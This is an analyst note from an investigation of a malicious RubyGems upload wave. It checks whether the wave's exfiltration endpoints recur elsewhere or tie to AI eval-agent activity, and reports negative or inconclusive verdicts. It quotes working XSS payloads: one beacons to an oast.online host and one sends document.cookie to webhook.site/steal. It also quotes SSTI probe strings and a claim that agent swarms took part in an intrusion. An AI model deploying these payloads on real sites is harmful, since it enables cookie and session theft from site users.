# Analyst note: exfil-endpoint pivot — July-7 XSS wave exfil identifiers (2026-09-28)

Lane 12, worker 3 of the off-task web-mechanism hunt. Question: is the
July-7 RubyGems wave's exfil infrastructure (oast.online, webhook.site)
shared with eval-agent activity, or does it belong to a separate actor?

## Identifiers (verbatim, from the public JFrog GemStuffer report,
fetched 2026-09-28; our holdings contain zero July-7 XSS payload bytes)

- **EXFIL-001**: `d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author`
  full: `<script>new Image().src="https://d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author"</script>`
  carrier: `attacker-xss-admin-1@0.0.1` (author field, XRAY-1078993).
- **EXFIL-002**: `https://webhook.site/steal?c='+document.cookie`
  full: `<img src=x onerror=fetch('https://webhook.site/steal?c='+document.cookie)>`
  carrier: `xssname-1783397821@0.0.1` (author field, XRAY-1079188).
- Non-exfil July-7 payloads (no identifiers to pivot): `test-apex-gem@0.1.3`
  `<img src=x onerror=alert(1)>`; SSTI probes `<%= 7*7 %>`, `${7*7}`,
  `<%25= 7*7 %>` (3 uploads in 5s); `xss-test-gem` description XSS probes
  (endpoints only in a JFrog screenshot, not extractable as text).

Wave context (JFrog): 215 packages / 333 releases, 2026-07-07
03:03:09-18:13:42 UTC; authors used `Testing <Animal>` format and `John Doe`.

## Q(a) — Do any identifiers recur outside the July-7 wave?

**Verdict: clean negative (no recurrence anywhere searched).**

- Repo-wide fixed-string grep: the identifiers appear ONLY in the JFrog
  report and its saved copy
  (`data/separate-eval-test/sources/jfrog-gemstuffer-post.html`). The prior
  webhook-deaddrops lane's full-repo negative (no `oast.online` /
  `webhook.site` in corpus content) independently corroborates.
- Hosted ES (read-only): `rubygems-goimport-campaign` — 0 hits for all four
  identifier strings; `july7-wave` — sweep metadata only (264 docs), no
  payload bytes.
- urlquery.io: verbatim oast ID **0 hits**; `webhook.site/steal` **0 hits**;
  generic `oast.online` 234 hits and `webhook.site` 208 hits — all unrelated
  (other Burp Collaborator client IDs, UUID webhook inboxes, CTF writeups).
  No scan captured either identifier or the `/admin-xss-author` path.
- Paste archives (`paste-archive`, `paste-archive-gap`, `iowacollab-pastes`),
  `data/overlap-matches.jsonl`: 0 (the webhook.site hits in the matches
  files are prior-hunt *negative* IOC records, `match_kind: "miss"`).
- Public web: identifiers appear only in the JFrog report itself.
- sourcegraph public code search (reachable again 2026-09-28): 0 matches for
  both identifiers, including archived+fork scopes. grep.app: HTTP 429,
  still unusable.

## Q(b) — Does the same exfil grammar appear in records tied to eval
infrastructure (artifactory paths, agent IDs, `zz` grammar, cybergym/exploitgym)?

**Verdict: no positive evidence; one attributed third-party service-level
claim.**

- No co-occurrence of the identifiers with artifactory / zz / cybergym /
  exploitgym / agent-ID markers anywhere in our data.
- The sibling XSS/SSTI census (`data/xss-ssti-census/payloads.jsonl`, 122
  payloads incl. eval-tied artifactory-board XSS and registry SSTI probes):
  zero `oast.online` / `webhook.site` occurrences in payload text.
- Third-party claim only: the termina.digital incident DB (investigator
  artifact, claims attributed to `openai-hf-report`, cited as reported)
  says "artifactory-swarm uses webhook. request capture during the hf
  intru[sion]" and "swarm-cohort uses webhook. also in HF hack." That is a
  service-level tradecraft claim about webhook.site in the HF intrusion —
  not a match to either July-7 identifier, and unverified.

## Q(c) — One actor's collaborator/webhook session, or many independent?

**Verdict: inconclusive from the identifiers alone; structure leans
single-session-per-payload but is non-attributable for the webhook half.**

- Only ONE oast.online hostname is published across the wave:
  `d96877a5q295v25se560q7ntmmwky7x8o` — a 32-char random Burp Collaborator
  client ID, i.e. one collaborator session for the `attacker-xss-admin-1`
  payload. N=1 gives no "many" signal, but a single session ID is consistent
  with one operator's Burp instance.
- The webhook.site target carries NO per-actor identifier:
  `https://webhook.site/steal?c=` is a bare path with no UUID token. Real
  webhook.site inboxes are UUID paths; `/steal` is generic CTF/demo
  placeholder grammar (it recurs verbatim in unrelated public prompt-injection
  test fixtures and XSS writeups). It cannot discriminate one actor from
  many — it is copy-paste-grade tradecraft.
- Timing (whole wave inside ~15h, one window) fits a single coordinated run,
  but JFrog's 1,388 distinct campaign authors mean account-count cannot be
  used as actor-count.
- Bottom line: the identifiers alone cannot settle shared-vs-separate. The
  oast ID is attributable to one session but links to nothing else; the
  webhook path is unattributable by construction.

## Overall

The July-7 exfil identifiers are **isolated**: no recurrence in any venue,
no tie to eval infrastructure, and no grammatical match to eval-tied XSS
payloads in our corpora. That isolation cuts both ways — it is evidence
against shared exfil infrastructure, but with zero July-7 payload bytes in
our holdings the negative is coverage-bound to the two published
identifiers. The single third-party datapoint (termina.digital's
as-reported webhook.site claim during the HF intrusion) is the only
adjacent signal and is explicitly unverified.

## Caveats

- Identifier set is exactly what JFrog published in text; the `xss-test-gem`
  description endpoints (screenshot-only) and any unlisted July-7 gems with
  exfil targets are outside this pivot.
- Name-suggestive July-7 gems with unknown payloads remain open:
  `apex_webhook_capture`, `webhook-capture-1783406220`,
  `webhook-fire-1783405247`, `webhook-payload-1783405583` (in JFrog CSV,
  absent from our Diffend corpus).
- "Absent" grades are coverage-bound per venue as documented above.

## Sources

- https://research.jfrog.com/post/gemstuffer-openai-rubygems/ (fetched
  2026-09-28; local copy `data/separate-eval-test/sources/jfrog-gemstuffer-post.html`)
- `data/july7-wave/diffend_sweep_results_july7.jsonl` (+resweep), hosted ES
  `july7-wave` (264 docs) and `rubygems-goimport-campaign` (read-only)
- urlquery.io searches (raw in `data/exfil-endpoint-pivot/raw/`)
- `data/xss-ssti-census/payloads.jsonl` (122 rows)
- `data/termina-digital/wayback/db/claims.html` (as-reported third-party claims)
- Prior: `data/webhook-deaddrops/` negative summary (2026-09-27)
